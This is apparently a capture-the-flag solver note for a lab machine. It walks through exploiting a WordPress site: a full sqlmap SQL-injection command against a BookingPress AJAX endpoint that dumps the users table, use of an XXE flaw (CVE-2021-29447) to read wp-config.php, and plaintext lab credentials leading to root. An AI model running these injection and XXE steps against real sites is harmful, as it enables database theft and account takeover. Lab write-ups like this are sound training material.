## Solver
```
curl -iL metatwo.htb found redirect new domain metapress.htb
SQL Injection :
sqlmap -u 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=3457c5c447&category_id=33&total_service=1' -p "total_service" --dbms="MySQL" --level=5 --risk=3 --dbs -D blog -T wp_users --dump
got creds manager:partylikearockstar
Wordpress 5.6.2 vuln CVE-2021-29447 XXE-Injection
https://github.com/AssassinUKG/Writeups/blob/main/tryhackme/Wordpress_CVE202129447/readme.md
read wp-config.php
got ftp creds metapress.htb:9NYS_ii@FyL_p5M2NvJ -H ftp.metapress.htb
read dir MAILER file send_email.php
got creds jnelson:Cb4_JmWM8zUZWMu@Ys
login ssh jnelson
got user flag
read pws file
got root creds root:p7qfAZt4_A1xo_0x
read root flag
```
